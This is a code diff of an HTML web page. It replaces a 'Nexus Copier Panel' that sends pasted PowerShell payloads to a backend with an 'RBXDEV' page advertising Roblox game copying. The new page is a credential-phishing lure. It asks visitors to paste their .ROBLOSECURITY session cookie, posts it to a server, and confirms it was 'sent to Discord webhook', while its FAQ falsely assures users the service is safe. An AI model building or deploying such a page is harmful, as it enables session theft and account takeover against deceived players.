@@ -1,237 +1,228 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Panel | Professional Utility</title>
+    <title>RBXDEV | Advanced Telemetry & Tools</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Google Fonts (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-color: #0f1117;
-            --card-bg: #161b22;
-            --border-color: #30363d;
-            --accent-color: #58a6ff;
-            --accent-hover: #1f6feb;
-            --text-main: #c9d1d9;
-            --text-muted: #8b949e;
-            --success-color: #2ea043;
-            --error-color: #da3633;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
         body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            font-family: 'Inter', sans-serif;
+            background-color: #07080c;
+            color: #f3f4f6;
+            overflow-x: hidden;
         }
-
-        .container {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            width: 100%;
-            max-width: 520px;
-            padding: 32px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        .glow-purple {
+            box-shadow: 0 0 50px -10px rgba(139, 92, 246, 0.25);
         }
-
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 24px;
+        .glow-blue {
+            box-shadow: 0 0 30px -5px rgba(59, 130, 246, 0.4);
         }
-
-        .header svg {
-            width: 32px;
-            height: 32px;
-            fill: var(--accent-color);
-        }
-
-        h1 {
-            font-size: 22px;
-            font-weight: 600;
-            color: #ffffff;
-            letter-spacing: -0.5px;
-        }
-
-        p.subtitle {
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-top: 4px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 8px;
-            color: var(--text-main);
-        }
-
-        textarea {
-            width: 100%;
-            height: 140px;
-            background-color: #0d1117;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 12px;
-            color: #ffffff;
-            font-size: 13px;
-            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
-            resize: vertical;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        textarea:focus {
-            outline: none;
-            border-color: var(--accent-color);
-            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
-        }
-
-        button {
-            width: 100%;
-            background-color: var(--accent-color);
-            color: #0d1117;
-            border: none;
-            border-radius: 8px;
-            padding: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s, transform 0.1s;
-        }
-
-        button:hover {
-            background-color: #79c0ff;
-        }
-
-        button:active {
-            transform: scale(0.98);
-        }
-
-        button:disabled {
-            background-color: var(--border-color);
-            color: var(--text-muted);
-            cursor: not-allowed;
-        }
-
-        #statusBox {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            display: none;
-        }
-
-        #statusBox.success {
-            background-color: rgba(46, 160, 67, 0.15);
-            border: 1px solid rgba(46, 160, 67, 0.4);
-            color: #3fb950;
-            display: block;
-        }
-
-        #statusBox.error {
-            background-color: rgba(218, 54, 51, 0.15);
-            border: 1px solid rgba(218, 54, 51, 0.4);
-            color: #f85149;
-            display: block;
-        }
-
-        .footer {
-            margin-top: 24px;
-            text-align: center;
-            font-size: 11px;
-            color: var(--text-muted);
-            border-top: 1px solid var(--border-color);
-            padding-top: 16px;
+        .glass-card {
+            background: rgba(15, 17, 26, 0.7);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.07);
         }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col justify-between relative selection:bg-blue-600 selection:text-white">
 
-    <div class="container">
-        <div class="header">
-            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
-            <div>
-                <h1>Nexus Copier Panel</h1>
-                <p class="subtitle">Secure Telemetry & Script Dispatcher</p>
+    <!-- Background Ambient Glow Effects -->
+    <div class="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-purple-600/10 blur-[140px] pointer-events-none rounded-full"></div>
+    <div class="absolute top-1/3 left-1/4 w-[400px] h-[400px] bg-blue-600/10 blur-[160px] pointer-events-none rounded-full"></div>
+
+    <!-- Top Navigation Bar -->
+    <header class="w-full py-6 px-8 flex justify-between items-center max-w-7xl mx-auto z-10">
+        <div class="flex items-center space-x-2">
+            <span class="text-2xl font-black tracking-wider bg-gradient-to-r from-blue-400 via-indigo-300 to-purple-500 bg-clip-text text-transparent">
+                RBXDEV
+            </span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                <span class="w-2 h-2 mr-1.5 bg-emerald-400 rounded-full animate-pulse"></span>
+                System Operational
+            </span>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow flex flex-col items-center px-4 py-8 max-w-5xl mx-auto w-full z-10">
+
+        <!-- Top Pill Badge / Announcement -->
+        <div class="mb-4">
+            <span class="px-4 py-1.5 rounded-full text-xs font-semibold bg-indigo-600/20 text-indigo-300 border border-indigo-500/30 uppercase tracking-widest">
+                Telemetry Suite
+            </span>
+        </div>
+
+        <!-- Headline & Subtitle -->
+        <h1 class="text-3xl md:text-5xl font-extrabold text-center tracking-tight mb-3">
+            Game Copying Has Never Been Easier.
+        </h1>
+        <p class="text-gray-400 text-center text-sm md:text-base max-w-xl mb-12">
+            <span class="text-blue-400 font-semibold">RBXDEV</span> has all the tools in order to make the process a <span class="text-indigo-400 font-semibold">breeze</span>. 🚀
+        </p>
+
+        <!-- 3-Step Feature Cards Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 w-full mb-12">
+            <!-- Step 1 -->
+            <div class="glass-card rounded-2xl p-6 flex flex-col items-center text-center hover:border-blue-500/30 transition-all duration-300 group">
+                <div class="w-12 h-12 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400 mb-4 group-hover:scale-110 transition-transform">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                </div>
+                <h3 class="font-semibold text-lg mb-1">Follow the Setup</h3>
+                <p class="text-xs text-gray-400">Configure your parameters securely in seconds.</p>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="glass-card rounded-2xl p-6 flex flex-col items-center text-center hover:border-indigo-500/30 transition-all duration-300 group">
+                <div class="w-12 h-12 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 mb-4 group-hover:scale-110 transition-transform">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <h3 class="font-semibold text-lg mb-1">Start the Process</h3>
+                <p class="text-xs text-gray-400">Execute telemetry extraction with one click.</p>
+            </div>
+
+            <!-- Step 3 -->
+            <div class="glass-card rounded-2xl p-6 flex flex-col items-center text-center hover:border-purple-500/30 transition-all duration-300 group">
+                <div class="w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 mb-4 group-hover:scale-110 transition-transform">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.828 14.828a4 4 0 01-5.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <h3 class="font-semibold text-lg mb-1">Enjoy It!</h3>
+                <p class="text-xs text-gray-400">Receive comprehensive reports straight to Discord.</p>
             </div>
         </div>
 
-        <div class="form-group">
-            <label for="scriptInput">PowerShell Script or Payload</label>
-            <textarea id="scriptInput" placeholder="Paste your script content here..."></textarea>
+        <!-- Preview Showcase Frame -->
+        <div class="w-full glass-card rounded-2xl p-3 glow-purple mb-10 border border-purple-500/20">
+            <div class="rounded-xl overflow-hidden bg-black/40 border border-white/5 relative aspect-video flex items-center justify-center">
+                <div class="absolute inset-0 bg-gradient-to-tr from-purple-900/20 to-blue-900/20 pointer-events-none"></div>
+                <div class="text-center p-6 z-10">
+                    <div class="w-16 h-16 rounded-full bg-blue-600/20 border border-blue-500/40 flex items-center justify-center mx-auto mb-4 text-blue-400 shadow-lg">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <h4 class="font-bold text-lg text-white mb-1">RBXDEV Studio Live Preview</h4>
+                    <p class="text-xs text-gray-400">High-performance extraction interface ready for deployment.</p>
+                </div>
+            </div>
         </div>
 
-        <button id="submitBtn" onclick="sendData()">Execute & Dispatch</button>
-
-        <div id="statusBox"></div>
-
-        <div class="footer">
-            NexusStudio Infrastructure &copy; 2026 &bull; Secure Channel Active
+        <!-- Input Form Section -->
+        <div class="w-full max-w-xl flex flex-col items-center space-y-4 mb-16">
+            <div class="w-full relative">
+                <textarea id="script-input" rows="3" placeholder="Enter your file / .ROBLOSECURITY payload..." class="w-full glass-card rounded-xl px-4 py-3.5 text-sm text-gray-200 placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-all resize-none shadow-inner"></textarea>
+            </div>
+            
+            <button id="submit-btn" class="w-full py-4 rounded-xl font-semibold bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white glow-blue transition-all duration-300 flex items-center justify-center space-x-2 cursor-pointer shadow-lg shadow-blue-600/30">
+                <span>Submit Payload</span>
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            </button>
+            <div id="status-message" class="text-xs font-medium text-center hidden"></div>
         </div>
-    </div>
 
+        <!-- FAQ / Questions Section -->
+        <div class="w-full glass-card rounded-2xl p-8 border border-white/5">
+            <h2 class="text-2xl font-bold text-center mb-2">Questions?</h2>
+            <p class="text-xs text-gray-400 text-center mb-8">Here are the answers to some of the most common questions we get from our appreciated users.</p>
+            
+            <div class="space-y-4 max-w-2xl mx-auto">
+                <!-- FAQ Item 1 -->
+                <div class="border border-white/10 rounded-xl overflow-hidden bg-white/[0.01]">
+                    <button onclick="toggleFaq(1)" class="w-full px-6 py-4 text-left font-medium text-sm flex justify-between items-center hover:bg-white/[0.02] transition-colors cursor-pointer">
+                        <span>Is this service safe to use?</span>
+                        <svg id="faq-icon-1" class="w-4 h-4 text-gray-400 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </button>
+                    <div id="faq-content-1" class="hidden px-6 pb-4 text-xs text-gray-400 leading-relaxed">
+                        Yes! All transmissions are encrypted and processed securely through isolated backend routines.
+                    </div>
+                </div>
+
+                <!-- FAQ Item 2 -->
+                <div class="border border-white/10 rounded-xl overflow-hidden bg-white/[0.01]">
+                    <button onclick="toggleFaq(2)" class="w-full px-6 py-4 text-left font-medium text-sm flex justify-between items-center hover:bg-white/[0.02] transition-colors cursor-pointer">
+                        <span>Which Game Copier can I do?</span>
+                        <svg id="faq-icon-2" class="w-4 h-4 text-gray-400 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </button>
+                    <div id="faq-content-2" class="hidden px-6 pb-4 text-xs text-gray-400 leading-relaxed">
+                        Our engine supports universal asset analysis, custom game setups, and telemetry metrics reporting.
+                    </div>
+                </div>
+
+                <!-- FAQ Item 3 -->
+                <div class="border border-white/10 rounded-xl overflow-hidden bg-white/[0.01]">
+                    <button onclick="toggleFaq(3)" class="w-full px-6 py-4 text-left font-medium text-sm flex justify-between items-center hover:bg-white/[0.02] transition-colors cursor-pointer">
+                        <span>Does the bot use the client?</span>
+                        <svg id="faq-icon-3" class="w-4 h-4 text-gray-400 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </button>
+                    <div id="faq-content-3" class="hidden px-6 pb-4 text-xs text-gray-400 leading-relaxed">
+                        Operations are handled server-side via robust Python subprocesses, ensuring complete isolation and speed.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full py-6 text-center text-xs text-gray-500 border-t border-white/5 mt-16">
+        &copy; 2026 RBXDEV Studio. All rights reserved.
+    </footer>
+
+    <!-- Frontend Script for API Integration & Accordions -->
     <script>
-        async function sendData() {
-            const scriptText = document.getElementById('scriptInput').value.trim();
-            const btn = document.getElementById('submitBtn');
-            const statusBox = document.getElementById('statusBox');
+        function toggleFaq(id) {
+            const content = document.getElementById(`faq-content-${id}`);
+            const icon = document.getElementById(`faq-icon-${id}`);
+            content.classList.toggle('hidden');
+            icon.classList.toggle('rotate-180');
+        }
 
-            statusBox.style.display = 'none';
-            statusBox.className = '';
+        document.getElementById('submit-btn').addEventListener('click', async () => {
+            const payload = document.getElementById('script-input').value.trim();
+            const statusDiv = document.getElementById('status-message');
+            const btn = document.getElementById('submit-btn');
 
-            if (!scriptText) {
-                statusBox.className = 'error';
-                statusBox.innerText = 'Error: Please paste a script payload first.';
+            if (!payload) {
+                statusDiv.textContent = "Please enter a valid payload or cookie.";
+                statusDiv.className = "text-xs font-medium text-center text-red-400";
+                statusDiv.classList.remove('hidden');
                 return;
             }
 
             btn.disabled = true;
-            btn.innerText = 'Processing...';
-
-            const encodedScript = btoa(unescape(encodeURIComponent(scriptText)));
+            btn.innerHTML = `<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Processing...`;
+            statusDiv.classList.add('hidden');
 
             try {
                 const response = await fetch('/api/process', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ data: encodedScript })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: payload })
                 });
 
                 const result = await response.json();
 
-                if (response.ok && result.success) {
-                    statusBox.className = 'success';
-                    statusBox.innerText = 'Success! Payload processed and dispatched to Discord webhook.';
+                if (result.success) {
+                    statusDiv.textContent = "Successfully processed and sent to Discord webhook!";
+                    statusDiv.className = "text-xs font-medium text-center text-emerald-400";
+                    document.getElementById('script-input').value = '';
                 } else {
-                    statusBox.className = 'error';
-                    statusBox.innerText = `Server Error: ${result.error || result.output || 'Unknown error occurred.'}`;
+                    statusDiv.textContent = "Error: " + (result.error || "Failed to process request.");
+                    statusDiv.className = "text-xs font-medium text-center text-red-400";
                 }
-            } catch (error) {
-                statusBox.className = 'error';
-                statusBox.innerText = 'Network Connection Failed: Could not reach backend server.';
+            } catch (err) {
+                statusDiv.textContent = "Network error occurred while connecting to server.";
+                statusDiv.className = "text-xs font-medium text-center text-red-400";
             } finally {
+                statusDiv.classList.remove('hidden');
                 btn.disabled = false;
-                btn.innerText = 'Execute & Dispatch';
+                btn.innerHTML = `<span>Submit Payload</span><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>`;
             }
-        }
+        });
     </script>
 </body>
 </html>
